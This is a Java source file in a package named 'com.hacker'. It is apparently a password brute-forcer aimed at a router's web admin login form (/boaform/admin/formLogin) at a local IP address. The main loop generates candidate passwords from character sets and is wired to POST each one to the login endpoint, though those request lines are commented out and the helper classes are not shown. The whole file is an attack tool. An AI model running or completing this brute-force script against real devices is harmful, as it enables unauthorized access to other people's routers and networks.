package com.hacker;

import org.json.simple.JSONObject;

public class Main {
    public static void main(String[] args) {
        String url = "http://192.168.55.1/boaform/admin/formLogin";
        try {
            EachLetterCreator elc = new EachLetterCreator();
            char[] eachLetterArr = elc.createEachLetter();

            PasswordMakser pm = new PasswordMakser();
            String[] resultArr = pm.createPasswords(eachLetterArr);

            JsonCreator jsonCreator = new JsonCreator();
            HttpRequester httpRequester = new HttpRequester();

            for(String eachResult : resultArr){
                for(char eachLetter : eachLetterArr){
                    String password = new StringBuilder().append(eachResult).append(eachLetter).toString();
//                    JSONObject jsonBody = jsonCreator.createJson(password);
//                    httpRequester.requestPost(url, jsonBody);
//                    System.out.println(password);
                }
            }
            System.out.println("--end");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
